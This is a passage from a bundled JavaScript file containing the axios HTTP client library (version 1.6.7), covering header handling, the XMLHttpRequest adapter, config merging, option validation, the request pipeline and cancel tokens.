  utils_default.forEach(["delete", "get", "head", "post", "put", "patch"], (method) => {
    defaults.headers[method] = {};
  });
  var defaults_default = defaults;

  // node_modules/axios/lib/helpers/parseHeaders.js
  var ignoreDuplicateOf = utils_default.toObjectSet([
    "age",
    "authorization",
    "content-length",
    "content-type",
    "etag",
    "expires",
    "from",
    "host",
    "if-modified-since",
    "if-unmodified-since",
    "last-modified",
    "location",
    "max-forwards",
    "proxy-authorization",
    "referer",
    "retry-after",
    "user-agent"
  ]);
  var parseHeaders_default = (rawHeaders) => {
    const parsed = {};
    let key;
    let val;
    let i;
    rawHeaders && rawHeaders.split("\n").forEach(function parser(line) {
      i = line.indexOf(":");
      key = line.substring(0, i).trim().toLowerCase();
      val = line.substring(i + 1).trim();
      if (!key || parsed[key] && ignoreDuplicateOf[key]) {
        return;
      }
      if (key === "set-cookie") {
        if (parsed[key]) {
          parsed[key].push(val);
        } else {
          parsed[key] = [val];
        }
      } else {
        parsed[key] = parsed[key] ? parsed[key] + ", " + val : val;
      }
    });
    return parsed;
  };

  // node_modules/axios/lib/core/AxiosHeaders.js
  var $internals = Symbol("internals");
  function normalizeHeader(header) {
    return header && String(header).trim().toLowerCase();
  }
  function normalizeValue(value) {
    if (value === false || value == null) {
      return value;
    }
    return utils_default.isArray(value) ? value.map(normalizeValue) : String(value);
  }
  function parseTokens(str) {
    const tokens = /* @__PURE__ */ Object.create(null);
    const tokensRE = /([^\s,;=]+)\s*(?:=\s*([^,;]+))?/g;
    let match;
    while (match = tokensRE.exec(str)) {
      tokens[match[1]] = match[2];
    }
    return tokens;
  }
  var isValidHeaderName = (str) => /^[-_a-zA-Z0-9^`|~,!#$%&'*+.]+$/.test(str.trim());
  function matchHeaderValue(context, value, header, filter2, isHeaderNameFilter) {
    if (utils_default.isFunction(filter2)) {
      return filter2.call(this, value, header);
    }
    if (isHeaderNameFilter) {
      value = header;
    }
    if (!utils_default.isString(value))
      return;
    if (utils_default.isString(filter2)) {
      return value.indexOf(filter2) !== -1;
    }
    if (utils_default.isRegExp(filter2)) {
      return filter2.test(value);
    }
  }
  function formatHeader(header) {
    return header.trim().toLowerCase().replace(/([a-z\d])(\w*)/g, (w, char, str) => {
      return char.toUpperCase() + str;
    });
  }
  function buildAccessors(obj, header) {
    const accessorName = utils_default.toCamelCase(" " + header);
    ["get", "set", "has"].forEach((methodName) => {
      Object.defineProperty(obj, methodName + accessorName, {
        value: function(arg1, arg2, arg3) {
          return this[methodName].call(this, header, arg1, arg2, arg3);
        },
        configurable: true
      });
    });
  }
  var AxiosHeaders = class {
    constructor(headers) {
      headers && this.set(headers);
    }
    set(header, valueOrRewrite, rewrite) {
      const self2 = this;
      function setHeader(_value, _header, _rewrite) {
        const lHeader = normalizeHeader(_header);
        if (!lHeader) {
          throw new Error("header name must be a non-empty string");
        }
        const key = utils_default.findKey(self2, lHeader);
        if (!key || self2[key] === void 0 || _rewrite === true || _rewrite === void 0 && self2[key] !== false) {
          self2[key || _header] = normalizeValue(_value);
        }
      }
      const setHeaders = (headers, _rewrite) => utils_default.forEach(headers, (_value, _header) => setHeader(_value, _header, _rewrite));
      if (utils_default.isPlainObject(header) || header instanceof this.constructor) {
        setHeaders(header, valueOrRewrite);
      } else if (utils_default.isString(header) && (header = header.trim()) && !isValidHeaderName(header)) {
        setHeaders(parseHeaders_default(header), valueOrRewrite);
      } else {
        header != null && setHeader(valueOrRewrite, header, rewrite);
      }
      return this;
    }
    get(header, parser) {
      header = normalizeHeader(header);
      if (header) {
        const key = utils_default.findKey(this, header);
        if (key) {
          const value = this[key];
          if (!parser) {
            return value;
          }
          if (parser === true) {
            return parseTokens(value);
          }
          if (utils_default.isFunction(parser)) {
            return parser.call(this, value, key);
          }
          if (utils_default.isRegExp(parser)) {
            return parser.exec(value);
          }
          throw new TypeError("parser must be boolean|regexp|function");
        }
      }
    }
    has(header, matcher) {
      header = normalizeHeader(header);
      if (header) {
        const key = utils_default.findKey(this, header);
        return !!(key && this[key] !== void 0 && (!matcher || matchHeaderValue(this, this[key], key, matcher)));
      }
      return false;
    }
    delete(header, matcher) {
      const self2 = this;
      let deleted = false;
      function deleteHeader(_header) {
        _header = normalizeHeader(_header);
        if (_header) {
          const key = utils_default.findKey(self2, _header);
          if (key && (!matcher || matchHeaderValue(self2, self2[key], key, matcher))) {
            delete self2[key];
            deleted = true;
          }
        }
      }
      if (utils_default.isArray(header)) {
        header.forEach(deleteHeader);
      } else {
        deleteHeader(header);
      }
      return deleted;
    }
    clear(matcher) {
      const keys = Object.keys(this);
      let i = keys.length;
      let deleted = false;
      while (i--) {
        const key = keys[i];
        if (!matcher || matchHeaderValue(this, this[key], key, matcher, true)) {
          delete this[key];
          deleted = true;
        }
      }
      return deleted;
    }
    normalize(format) {
      const self2 = this;
      const headers = {};
      utils_default.forEach(this, (value, header) => {
        const key = utils_default.findKey(headers, header);
        if (key) {
          self2[key] = normalizeValue(value);
          delete self2[header];
          return;
        }
        const normalized = format ? formatHeader(header) : String(header).trim();
        if (normalized !== header) {
          delete self2[header];
        }
        self2[normalized] = normalizeValue(value);
        headers[normalized] = true;
      });
      return this;
    }
    concat(...targets) {
      return this.constructor.concat(this, ...targets);
    }
    toJSON(asStrings) {
      const obj = /* @__PURE__ */ Object.create(null);
      utils_default.forEach(this, (value, header) => {
        value != null && value !== false && (obj[header] = asStrings && utils_default.isArray(value) ? value.join(", ") : value);
      });
      return obj;
    }
    [Symbol.iterator]() {
      return Object.entries(this.toJSON())[Symbol.iterator]();
    }
    toString() {
      return Object.entries(this.toJSON()).map(([header, value]) => header + ": " + value).join("\n");
    }
    get [Symbol.toStringTag]() {
      return "AxiosHeaders";
    }
    static from(thing) {
      return thing instanceof this ? thing : new this(thing);
    }
    static concat(first, ...targets) {
      const computed = new this(first);
      targets.forEach((target) => computed.set(target));
      return computed;
    }
    static accessor(header) {
      const internals = this[$internals] = this[$internals] = {
        accessors: {}
      };
      const accessors = internals.accessors;
      const prototype3 = this.prototype;
      function defineAccessor(_header) {
        const lHeader = normalizeHeader(_header);
        if (!accessors[lHeader]) {
          buildAccessors(prototype3, _header);
          accessors[lHeader] = true;
        }
      }
      utils_default.isArray(header) ? header.forEach(defineAccessor) : defineAccessor(header);
      return this;
    }
  };
  AxiosHeaders.accessor(["Content-Type", "Content-Length", "Accept", "Accept-Encoding", "User-Agent", "Authorization"]);
  utils_default.reduceDescriptors(AxiosHeaders.prototype, ({ value }, key) => {
    let mapped = key[0].toUpperCase() + key.slice(1);
    return {
      get: () => value,
      set(headerValue) {
        this[mapped] = headerValue;
      }
    };
  });
  utils_default.freezeMethods(AxiosHeaders);
  var AxiosHeaders_default = AxiosHeaders;

  // node_modules/axios/lib/core/transformData.js
  function transformData(fns, response) {
    const config = this || defaults_default;
    const context = response || config;
    const headers = AxiosHeaders_default.from(context.headers);
    let data = context.data;
    utils_default.forEach(fns, function transform(fn) {
      data = fn.call(config, data, headers.normalize(), response ? response.status : void 0);
    });
    headers.normalize();
    return data;
  }

  // node_modules/axios/lib/cancel/isCancel.js
  function isCancel(value) {
    return !!(value && value.__CANCEL__);
  }

  // node_modules/axios/lib/cancel/CanceledError.js
  function CanceledError(message, config, request) {
    AxiosError_default.call(this, message == null ? "canceled" : message, AxiosError_default.ERR_CANCELED, config, request);
    this.name = "CanceledError";
  }
  utils_default.inherits(CanceledError, AxiosError_default, {
    __CANCEL__: true
  });
  var CanceledError_default = CanceledError;

  // node_modules/axios/lib/core/settle.js
  function settle(resolve, reject, response) {
    const validateStatus2 = response.config.validateStatus;
    if (!response.status || !validateStatus2 || validateStatus2(response.status)) {
      resolve(response);
    } else {
      reject(new AxiosError_default(
        "Request failed with status code " + response.status,
        [AxiosError_default.ERR_BAD_REQUEST, AxiosError_default.ERR_BAD_RESPONSE][Math.floor(response.status / 100) - 4],
        response.config,
        response.request,
        response
      ));
    }
  }

  // node_modules/axios/lib/helpers/cookies.js
  var cookies_default = platform_default.hasStandardBrowserEnv ? (
    // Standard browser envs support document.cookie
    {
      write(name, value, expires, path, domain, secure) {
        const cookie = [name + "=" + encodeURIComponent(value)];
        utils_default.isNumber(expires) && cookie.push("expires=" + new Date(expires).toGMTString());
        utils_default.isString(path) && cookie.push("path=" + path);
        utils_default.isString(domain) && cookie.push("domain=" + domain);
        secure === true && cookie.push("secure");
        document.cookie = cookie.join("; ");
      },
      read(name) {
        const match = document.cookie.match(new RegExp("(^|;\\s*)(" + name + ")=([^;]*)"));
        return match ? decodeURIComponent(match[3]) : null;
      },
      remove(name) {
        this.write(name, "", Date.now() - 864e5);
      }
    }
  ) : (
    // Non-standard browser env (web workers, react-native) lack needed support.
    {
      write() {
      },
      read() {
        return null;
      },
      remove() {
      }
    }
  );

  // node_modules/axios/lib/helpers/isAbsoluteURL.js
  function isAbsoluteURL(url) {
    return /^([a-z][a-z\d+\-.]*:)?\/\//i.test(url);
  }

  // node_modules/axios/lib/helpers/combineURLs.js
  function combineURLs(baseURL, relativeURL) {
    return relativeURL ? baseURL.replace(/\/?\/$/, "") + "/" + relativeURL.replace(/^\/+/, "") : baseURL;
  }

  // node_modules/axios/lib/core/buildFullPath.js
  function buildFullPath(baseURL, requestedURL) {
    if (baseURL && !isAbsoluteURL(requestedURL)) {
      return combineURLs(baseURL, requestedURL);
    }
    return requestedURL;
  }

  // node_modules/axios/lib/helpers/isURLSameOrigin.js
  var isURLSameOrigin_default = platform_default.hasStandardBrowserEnv ? (
    // Standard browser envs have full support of the APIs needed to test
    // whether the request URL is of the same origin as current location.
    function standardBrowserEnv() {
      const msie = /(msie|trident)/i.test(navigator.userAgent);
      const urlParsingNode = document.createElement("a");
      let originURL;
      function resolveURL(url) {
        let href = url;
        if (msie) {
          urlParsingNode.setAttribute("href", href);
          href = urlParsingNode.href;
        }
        urlParsingNode.setAttribute("href", href);
        return {
          href: urlParsingNode.href,
          protocol: urlParsingNode.protocol ? urlParsingNode.protocol.replace(/:$/, "") : "",
          host: urlParsingNode.host,
          search: urlParsingNode.search ? urlParsingNode.search.replace(/^\?/, "") : "",
          hash: urlParsingNode.hash ? urlParsingNode.hash.replace(/^#/, "") : "",
          hostname: urlParsingNode.hostname,
          port: urlParsingNode.port,
          pathname: urlParsingNode.pathname.charAt(0) === "/" ? urlParsingNode.pathname : "/" + urlParsingNode.pathname
        };
      }
      originURL = resolveURL(window.location.href);
      return function isURLSameOrigin(requestURL) {
        const parsed = utils_default.isString(requestURL) ? resolveURL(requestURL) : requestURL;
        return parsed.protocol === originURL.protocol && parsed.host === originURL.host;
      };
    }()
  ) : (
    // Non standard browser envs (web workers, react-native) lack needed support.
    /* @__PURE__ */ function nonStandardBrowserEnv() {
      return function isURLSameOrigin() {
        return true;
      };
    }()
  );

  // node_modules/axios/lib/helpers/parseProtocol.js
  function parseProtocol(url) {
    const match = /^([-+\w]{1,25})(:?\/\/|:)/.exec(url);
    return match && match[1] || "";
  }

  // node_modules/axios/lib/helpers/speedometer.js
  function speedometer(samplesCount, min) {
    samplesCount = samplesCount || 10;
    const bytes = new Array(samplesCount);
    const timestamps = new Array(samplesCount);
    let head = 0;
    let tail = 0;
    let firstSampleTS;
    min = min !== void 0 ? min : 1e3;
    return function push(chunkLength) {
      const now2 = Date.now();
      const startedAt = timestamps[tail];
      if (!firstSampleTS) {
        firstSampleTS = now2;
      }
      bytes[head] = chunkLength;
      timestamps[head] = now2;
      let i = tail;
      let bytesCount = 0;
      while (i !== head) {
        bytesCount += bytes[i++];
        i = i % samplesCount;
      }
      head = (head + 1) % samplesCount;
      if (head === tail) {
        tail = (tail + 1) % samplesCount;
      }
      if (now2 - firstSampleTS < min) {
        return;
      }
      const passed = startedAt && now2 - startedAt;
      return passed ? Math.round(bytesCount * 1e3 / passed) : void 0;
    };
  }
  var speedometer_default = speedometer;

  // node_modules/axios/lib/adapters/xhr.js
  function progressEventReducer(listener, isDownloadStream) {
    let bytesNotified = 0;
    const _speedometer = speedometer_default(50, 250);
    return (e) => {
      const loaded = e.loaded;
      const total = e.lengthComputable ? e.total : void 0;
      const progressBytes = loaded - bytesNotified;
      const rate = _speedometer(progressBytes);
      const inRange = loaded <= total;
      bytesNotified = loaded;
      const data = {
        loaded,
        total,
        progress: total ? loaded / total : void 0,
        bytes: progressBytes,
        rate: rate ? rate : void 0,
        estimated: rate && total && inRange ? (total - loaded) / rate : void 0,
        event: e
      };
      data[isDownloadStream ? "download" : "upload"] = true;
      listener(data);
    };
  }
  var isXHRAdapterSupported = typeof XMLHttpRequest !== "undefined";
  var xhr_default = isXHRAdapterSupported && function(config) {
    return new Promise(function dispatchXhrRequest(resolve, reject) {
      let requestData = config.data;
      const requestHeaders = AxiosHeaders_default.from(config.headers).normalize();
      let { responseType, withXSRFToken } = config;
      let onCanceled;
      function done() {
        if (config.cancelToken) {
          config.cancelToken.unsubscribe(onCanceled);
        }
        if (config.signal) {
          config.signal.removeEventListener("abort", onCanceled);
        }
      }
      let contentType;
      if (utils_default.isFormData(requestData)) {
        if (platform_default.hasStandardBrowserEnv || platform_default.hasStandardBrowserWebWorkerEnv) {
          requestHeaders.setContentType(false);
        } else if ((contentType = requestHeaders.getContentType()) !== false) {
          const [type, ...tokens] = contentType ? contentType.split(";").map((token) => token.trim()).filter(Boolean) : [];
          requestHeaders.setContentType([type || "multipart/form-data", ...tokens].join("; "));
        }
      }
      let request = new XMLHttpRequest();
      if (config.auth) {
        const username = config.auth.username || "";
        const password = config.auth.password ? unescape(encodeURIComponent(config.auth.password)) : "";
        requestHeaders.set("Authorization", "Basic " + btoa(username + ":" + password));
      }
      const fullPath = buildFullPath(config.baseURL, config.url);
      request.open(config.method.toUpperCase(), buildURL(fullPath, config.params, config.paramsSerializer), true);
      request.timeout = config.timeout;
      function onloadend() {
        if (!request) {
          return;
        }
        const responseHeaders = AxiosHeaders_default.from(
          "getAllResponseHeaders" in request && request.getAllResponseHeaders()
        );
        const responseData = !responseType || responseType === "text" || responseType === "json" ? request.responseText : request.response;
        const response = {
          data: responseData,
          status: request.status,
          statusText: request.statusText,
          headers: responseHeaders,
          config,
          request
        };
        settle(function _resolve(value) {
          resolve(value);
          done();
        }, function _reject(err) {
          reject(err);
          done();
        }, response);
        request = null;
      }
      if ("onloadend" in request) {
        request.onloadend = onloadend;
      } else {
        request.onreadystatechange = function handleLoad() {
          if (!request || request.readyState !== 4) {
            return;
          }
          if (request.status === 0 && !(request.responseURL && request.responseURL.indexOf("file:") === 0)) {
            return;
          }
          setTimeout(onloadend);
        };
      }
      request.onabort = function handleAbort() {
        if (!request) {
          return;
        }
        reject(new AxiosError_default("Request aborted", AxiosError_default.ECONNABORTED, config, request));
        request = null;
      };
      request.onerror = function handleError() {
        reject(new AxiosError_default("Network Error", AxiosError_default.ERR_NETWORK, config, request));
        request = null;
      };
      request.ontimeout = function handleTimeout() {
        let timeoutErrorMessage = config.timeout ? "timeout of " + config.timeout + "ms exceeded" : "timeout exceeded";
        const transitional2 = config.transitional || transitional_default;
        if (config.timeoutErrorMessage) {
          timeoutErrorMessage = config.timeoutErrorMessage;
        }
        reject(new AxiosError_default(
          timeoutErrorMessage,
          transitional2.clarifyTimeoutError ? AxiosError_default.ETIMEDOUT : AxiosError_default.ECONNABORTED,
          config,
          request
        ));
        request = null;
      };
      if (platform_default.hasStandardBrowserEnv) {
        withXSRFToken && utils_default.isFunction(withXSRFToken) && (withXSRFToken = withXSRFToken(config));
        if (withXSRFToken || withXSRFToken !== false && isURLSameOrigin_default(fullPath)) {
          const xsrfValue = config.xsrfHeaderName && config.xsrfCookieName && cookies_default.read(config.xsrfCookieName);
          if (xsrfValue) {
            requestHeaders.set(config.xsrfHeaderName, xsrfValue);
          }
        }
      }
      requestData === void 0 && requestHeaders.setContentType(null);
      if ("setRequestHeader" in request) {
        utils_default.forEach(requestHeaders.toJSON(), function setRequestHeader(val, key) {
          request.setRequestHeader(key, val);
        });
      }
      if (!utils_default.isUndefined(config.withCredentials)) {
        request.withCredentials = !!config.withCredentials;
      }
      if (responseType && responseType !== "json") {
        request.responseType = config.responseType;
      }
      if (typeof config.onDownloadProgress === "function") {
        request.addEventListener("progress", progressEventReducer(config.onDownloadProgress, true));
      }
      if (typeof config.onUploadProgress === "function" && request.upload) {
        request.upload.addEventListener("progress", progressEventReducer(config.onUploadProgress));
      }
      if (config.cancelToken || config.signal) {
        onCanceled = (cancel) => {
          if (!request) {
            return;
          }
          reject(!cancel || cancel.type ? new CanceledError_default(null, config, request) : cancel);
          request.abort();
          request = null;
        };
        config.cancelToken && config.cancelToken.subscribe(onCanceled);
        if (config.signal) {
          config.signal.aborted ? onCanceled() : config.signal.addEventListener("abort", onCanceled);
        }
      }
      const protocol = parseProtocol(fullPath);
      if (protocol && platform_default.protocols.indexOf(protocol) === -1) {
        reject(new AxiosError_default("Unsupported protocol " + protocol + ":", AxiosError_default.ERR_BAD_REQUEST, config));
        return;
      }
      request.send(requestData || null);
    });
  };

  // node_modules/axios/lib/adapters/adapters.js
  var knownAdapters = {
    http: null_default,
    xhr: xhr_default
  };
  utils_default.forEach(knownAdapters, (fn, value) => {
    if (fn) {
      try {
        Object.defineProperty(fn, "name", { value });
      } catch (e) {
      }
      Object.defineProperty(fn, "adapterName", { value });
    }
  });
  var renderReason = (reason) => `- ${reason}`;
  var isResolvedHandle = (adapter) => utils_default.isFunction(adapter) || adapter === null || adapter === false;
  var adapters_default2 = {
    getAdapter: (adapters) => {
      adapters = utils_default.isArray(adapters) ? adapters : [adapters];
      const { length } = adapters;
      let nameOrAdapter;
      let adapter;
      const rejectedReasons = {};
      for (let i = 0; i < length; i++) {
        nameOrAdapter = adapters[i];
        let id;
        adapter = nameOrAdapter;
        if (!isResolvedHandle(nameOrAdapter)) {
          adapter = knownAdapters[(id = String(nameOrAdapter)).toLowerCase()];
          if (adapter === void 0) {
            throw new AxiosError_default(`Unknown adapter '${id}'`);
          }
        }
        if (adapter) {
          break;
        }
        rejectedReasons[id || "#" + i] = adapter;
      }
      if (!adapter) {
        const reasons = Object.entries(rejectedReasons).map(
          ([id, state]) => `adapter ${id} ` + (state === false ? "is not supported by the environment" : "is not available in the build")
        );
        let s = length ? reasons.length > 1 ? "since :\n" + reasons.map(renderReason).join("\n") : " " + renderReason(reasons[0]) : "as no adapter specified";
        throw new AxiosError_default(
          `There is no suitable adapter to dispatch the request ` + s,
          "ERR_NOT_SUPPORT"
        );
      }
      return adapter;
    },
    adapters: knownAdapters
  };

  // node_modules/axios/lib/core/dispatchRequest.js
  function throwIfCancellationRequested(config) {
    if (config.cancelToken) {
      config.cancelToken.throwIfRequested();
    }
    if (config.signal && config.signal.aborted) {
      throw new CanceledError_default(null, config);
    }
  }
  function dispatchRequest(config) {
    throwIfCancellationRequested(config);
    config.headers = AxiosHeaders_default.from(config.headers);
    config.data = transformData.call(
      config,
      config.transformRequest
    );
    if (["post", "put", "patch"].indexOf(config.method) !== -1) {
      config.headers.setContentType("application/x-www-form-urlencoded", false);
    }
    const adapter = adapters_default2.getAdapter(config.adapter || defaults_default.adapter);
    return adapter(config).then(function onAdapterResolution(response) {
      throwIfCancellationRequested(config);
      response.data = transformData.call(
        config,
        config.transformResponse,
        response
      );
      response.headers = AxiosHeaders_default.from(response.headers);
      return response;
    }, function onAdapterRejection(reason) {
      if (!isCancel(reason)) {
        throwIfCancellationRequested(config);
        if (reason && reason.response) {
          reason.response.data = transformData.call(
            config,
            config.transformResponse,
            reason.response
          );
          reason.response.headers = AxiosHeaders_default.from(reason.response.headers);
        }
      }
      return Promise.reject(reason);
    });
  }

  // node_modules/axios/lib/core/mergeConfig.js
  var headersToObject = (thing) => thing instanceof AxiosHeaders_default ? thing.toJSON() : thing;
  function mergeConfig(config1, config2) {
    config2 = config2 || {};
    const config = {};
    function getMergedValue(target, source, caseless) {
      if (utils_default.isPlainObject(target) && utils_default.isPlainObject(source)) {
        return utils_default.merge.call({ caseless }, target, source);
      } else if (utils_default.isPlainObject(source)) {
        return utils_default.merge({}, source);
      } else if (utils_default.isArray(source)) {
        return source.slice();
      }
      return source;
    }
    function mergeDeepProperties(a, b, caseless) {
      if (!utils_default.isUndefined(b)) {
        return getMergedValue(a, b, caseless);
      } else if (!utils_default.isUndefined(a)) {
        return getMergedValue(void 0, a, caseless);
      }
    }
    function valueFromConfig2(a, b) {
      if (!utils_default.isUndefined(b)) {
        return getMergedValue(void 0, b);
      }
    }
    function defaultToConfig2(a, b) {
      if (!utils_default.isUndefined(b)) {
        return getMergedValue(void 0, b);
      } else if (!utils_default.isUndefined(a)) {
        return getMergedValue(void 0, a);
      }
    }
    function mergeDirectKeys(a, b, prop) {
      if (prop in config2) {
        return getMergedValue(a, b);
      } else if (prop in config1) {
        return getMergedValue(void 0, a);
      }
    }
    const mergeMap = {
      url: valueFromConfig2,
      method: valueFromConfig2,
      data: valueFromConfig2,
      baseURL: defaultToConfig2,
      transformRequest: defaultToConfig2,
      transformResponse: defaultToConfig2,
      paramsSerializer: defaultToConfig2,
      timeout: defaultToConfig2,
      timeoutMessage: defaultToConfig2,
      withCredentials: defaultToConfig2,
      withXSRFToken: defaultToConfig2,
      adapter: defaultToConfig2,
      responseType: defaultToConfig2,
      xsrfCookieName: defaultToConfig2,
      xsrfHeaderName: defaultToConfig2,
      onUploadProgress: defaultToConfig2,
      onDownloadProgress: defaultToConfig2,
      decompress: defaultToConfig2,
      maxContentLength: defaultToConfig2,
      maxBodyLength: defaultToConfig2,
      beforeRedirect: defaultToConfig2,
      transport: defaultToConfig2,
      httpAgent: defaultToConfig2,
      httpsAgent: defaultToConfig2,
      cancelToken: defaultToConfig2,
      socketPath: defaultToConfig2,
      responseEncoding: defaultToConfig2,
      validateStatus: mergeDirectKeys,
      headers: (a, b) => mergeDeepProperties(headersToObject(a), headersToObject(b), true)
    };
    utils_default.forEach(Object.keys(Object.assign({}, config1, config2)), function computeConfigValue(prop) {
      const merge2 = mergeMap[prop] || mergeDeepProperties;
      const configValue = merge2(config1[prop], config2[prop], prop);
      utils_default.isUndefined(configValue) && merge2 !== mergeDirectKeys || (config[prop] = configValue);
    });
    return config;
  }

  // node_modules/axios/lib/env/data.js
  var VERSION = "1.6.7";

  // node_modules/axios/lib/helpers/validator.js
  var validators = {};
  ["object", "boolean", "number", "function", "string", "symbol"].forEach((type, i) => {
    validators[type] = function validator(thing) {
      return typeof thing === type || "a" + (i < 1 ? "n " : " ") + type;
    };
  });
  var deprecatedWarnings = {};
  validators.transitional = function transitional(validator, version, message) {
    function formatMessage(opt, desc) {
      return "[Axios v" + VERSION + "] Transitional option '" + opt + "'" + desc + (message ? ". " + message : "");
    }
    return (value, opt, opts) => {
      if (validator === false) {
        throw new AxiosError_default(
          formatMessage(opt, " has been removed" + (version ? " in " + version : "")),
          AxiosError_default.ERR_DEPRECATED
        );
      }
      if (version && !deprecatedWarnings[opt]) {
        deprecatedWarnings[opt] = true;
        console.warn(
          formatMessage(
            opt,
            " has been deprecated since v" + version + " and will be removed in the near future"
          )
        );
      }
      return validator ? validator(value, opt, opts) : true;
    };
  };
  function assertOptions(options, schema, allowUnknown) {
    if (typeof options !== "object") {
      throw new AxiosError_default("options must be an object", AxiosError_default.ERR_BAD_OPTION_VALUE);
    }
    const keys = Object.keys(options);
    let i = keys.length;
    while (i-- > 0) {
      const opt = keys[i];
      const validator = schema[opt];
      if (validator) {
        const value = options[opt];
        const result = value === void 0 || validator(value, opt, options);
        if (result !== true) {
          throw new AxiosError_default("option " + opt + " must be " + result, AxiosError_default.ERR_BAD_OPTION_VALUE);
        }
        continue;
      }
      if (allowUnknown !== true) {
        throw new AxiosError_default("Unknown option " + opt, AxiosError_default.ERR_BAD_OPTION);
      }
    }
  }
  var validator_default = {
    assertOptions,
    validators
  };

  // node_modules/axios/lib/core/Axios.js
  var validators2 = validator_default.validators;
  var Axios = class {
    constructor(instanceConfig) {
      this.defaults = instanceConfig;
      this.interceptors = {
        request: new InterceptorManager_default(),
        response: new InterceptorManager_default()
      };
    }
    /**
     * Dispatch a request
     *
     * @param {String|Object} configOrUrl The config specific for this request (merged with this.defaults)
     * @param {?Object} config
     *
     * @returns {Promise} The Promise to be fulfilled
     */
    async request(configOrUrl, config) {
      try {
        return await this._request(configOrUrl, config);
      } catch (err) {
        if (err instanceof Error) {
          let dummy;
          Error.captureStackTrace ? Error.captureStackTrace(dummy = {}) : dummy = new Error();
          const stack = dummy.stack ? dummy.stack.replace(/^.+\n/, "") : "";
          if (!err.stack) {
            err.stack = stack;
          } else if (stack && !String(err.stack).endsWith(stack.replace(/^.+\n.+\n/, ""))) {
            err.stack += "\n" + stack;
          }
        }
        throw err;
      }
    }
    _request(configOrUrl, config) {
      if (typeof configOrUrl === "string") {
        config = config || {};
        config.url = configOrUrl;
      } else {
        config = configOrUrl || {};
      }
      config = mergeConfig(this.defaults, config);
      const { transitional: transitional2, paramsSerializer, headers } = config;
      if (transitional2 !== void 0) {
        validator_default.assertOptions(transitional2, {
          silentJSONParsing: validators2.transitional(validators2.boolean),
          forcedJSONParsing: validators2.transitional(validators2.boolean),
          clarifyTimeoutError: validators2.transitional(validators2.boolean)
        }, false);
      }
      if (paramsSerializer != null) {
        if (utils_default.isFunction(paramsSerializer)) {
          config.paramsSerializer = {
            serialize: paramsSerializer
          };
        } else {
          validator_default.assertOptions(paramsSerializer, {
            encode: validators2.function,
            serialize: validators2.function
          }, true);
        }
      }
      config.method = (config.method || this.defaults.method || "get").toLowerCase();
      let contextHeaders = headers && utils_default.merge(
        headers.common,
        headers[config.method]
      );
      headers && utils_default.forEach(
        ["delete", "get", "head", "post", "put", "patch", "common"],
        (method) => {
          delete headers[method];
        }
      );
      config.headers = AxiosHeaders_default.concat(contextHeaders, headers);
      const requestInterceptorChain = [];
      let synchronousRequestInterceptors = true;
      this.interceptors.request.forEach(function unshiftRequestInterceptors(interceptor) {
        if (typeof interceptor.runWhen === "function" && interceptor.runWhen(config) === false) {
          return;
        }
        synchronousRequestInterceptors = synchronousRequestInterceptors && interceptor.synchronous;
        requestInterceptorChain.unshift(interceptor.fulfilled, interceptor.rejected);
      });
      const responseInterceptorChain = [];
      this.interceptors.response.forEach(function pushResponseInterceptors(interceptor) {
        responseInterceptorChain.push(interceptor.fulfilled, interceptor.rejected);
      });
      let promise;
      let i = 0;
      let len;
      if (!synchronousRequestInterceptors) {
        const chain = [dispatchRequest.bind(this), void 0];
        chain.unshift.apply(chain, requestInterceptorChain);
        chain.push.apply(chain, responseInterceptorChain);
        len = chain.length;
        promise = Promise.resolve(config);
        while (i < len) {
          promise = promise.then(chain[i++], chain[i++]);
        }
        return promise;
      }
      len = requestInterceptorChain.length;
      let newConfig = config;
      i = 0;
      while (i < len) {
        const onFulfilled = requestInterceptorChain[i++];
        const onRejected = requestInterceptorChain[i++];
        try {
          newConfig = onFulfilled(newConfig);
        } catch (error2) {
          onRejected.call(this, error2);
          break;
        }
      }
      try {
        promise = dispatchRequest.call(this, newConfig);
      } catch (error2) {
        return Promise.reject(error2);
      }
      i = 0;
      len = responseInterceptorChain.length;
      while (i < len) {
        promise = promise.then(responseInterceptorChain[i++], responseInterceptorChain[i++]);
      }
      return promise;
    }
    getUri(config) {
      config = mergeConfig(this.defaults, config);
      const fullPath = buildFullPath(config.baseURL, config.url);
      return buildURL(fullPath, config.params, config.paramsSerializer);
    }
  };
  utils_default.forEach(["delete", "get", "head", "options"], function forEachMethodNoData(method) {
    Axios.prototype[method] = function(url, config) {
      return this.request(mergeConfig(config || {}, {
        method,
        url,
        data: (config || {}).data
      }));
    };
  });
  utils_default.forEach(["post", "put", "patch"], function forEachMethodWithData(method) {
    function generateHTTPMethod(isForm) {
      return function httpMethod(url, data, config) {
        return this.request(mergeConfig(config || {}, {
          method,
          headers: isForm ? {
            "Content-Type": "multipart/form-data"
          } : {},
          url,
          data
        }));
      };
    }
    Axios.prototype[method] = generateHTTPMethod();
    Axios.prototype[method + "Form"] = generateHTTPMethod(true);
  });
  var Axios_default = Axios;

  // node_modules/axios/lib/cancel/CancelToken.js
  var CancelToken = class _CancelToken {
    constructor(executor) {
      if (typeof executor !== "function") {
        throw new TypeError("executor must be a function.");
      }
      let resolvePromise;
      this.promise = new Promise(function promiseExecutor(resolve) {
        resolvePromise = resolve;
      });
      const token = this;
      this.promise.then((cancel) => {
        if (!token._listeners)
          return;
        let i = token._listeners.length;
        while (i-- > 0) {
          token._listeners[i](cancel);
        }
        token._listeners = null;
      });
      this.promise.then = (onfulfilled) => {
        let _resolve;
        const promise = new Promise((resolve) => {
          token.subscribe(resolve);
          _resolve = resolve;
        }).then(onfulfilled);
        promise.cancel = function reject() {
          token.unsubscribe(_resolve);
        };
        return promise;
      };
      executor(function cancel(message, config, request) {
        if (token.reason) {
          return;
        }
        token.reason = new CanceledError_default(message, config, request);
        resolvePromise(token.reason);
      });
    }
    /**
     * Throws a `CanceledError` if cancellation has been requested.
     */
    throwIfRequested() {
      if (this.reason) {
        throw this.reason;
      }
    }
    /**
     * Subscribe to the cancel signal
     */
    subscribe(listener) {
      if (this.reason) {
        listener(this.reason);
        return;
      }
      if (this._listeners) {
        this._listeners.push(listener);
      } else {
        this._listeners = [listener];
      }
    }
    /**
     * Unsubscribe from the cancel signal
     */
    unsubscribe(listener) {
      if (!this._listeners) {
        return;
      }
      const index = this._listeners.indexOf(listener);
      if (index !== -1) {
        this._listeners.splice(index, 1);
      }
    }
    /**
     * Returns an object that contains a new `CancelToken` and a function that, when called,
     * cancels the `CancelToken`.
     */
    static source() {
      let cancel;
      const token = new _CancelToken(function executor(c) {
        cancel = c;
      });
      return {
        token,
        cancel
      };
    }
  };
  var CancelToken_default = CancelToken;

  // node_modules/axios/lib/helpers/spread.js
  function spread(callback) {
    return function wrap(arr) {
